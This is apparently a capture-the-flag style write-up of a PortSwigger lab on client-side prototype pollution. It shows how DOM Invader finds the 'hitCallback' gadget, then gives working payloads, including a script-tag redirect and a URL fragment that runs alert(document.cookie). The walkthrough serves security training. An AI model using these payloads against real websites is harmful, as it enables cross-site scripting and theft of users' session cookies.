# Lab 3

### Objective: Get document.cookie

#### Automatic method

In this lab, we are recommended to use DOM Invader as it saves us time and effort. First just use it like the same open the browser and the extension

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

And we get the alert here after exploiting the exploiting the gadget which is `hitCallback`

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Here is the generated payload that calls an alert

```
/#__proto__[hitCallback]=alert%281%29
```

Now, the objective is to steal the cookie, Portswigger already mad a server for which we can deliver the payload

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

We craft the exploit with `<script>` tags in the body with the `location` reference being our payload

```
<script>
    location="https://0adc007d04ba9aaa8508314200390060.web-security-academy.net/#__proto__[hitCallback]=alert%281%29"
</script>
```

But the payload is URL-encoded, we can check using Cyberchef

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

#### Exploit

Only change the alert to a `document.cookie` and the exploit is set.

```
https://0adc007d04ba9aaa8508314200390060.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29
```
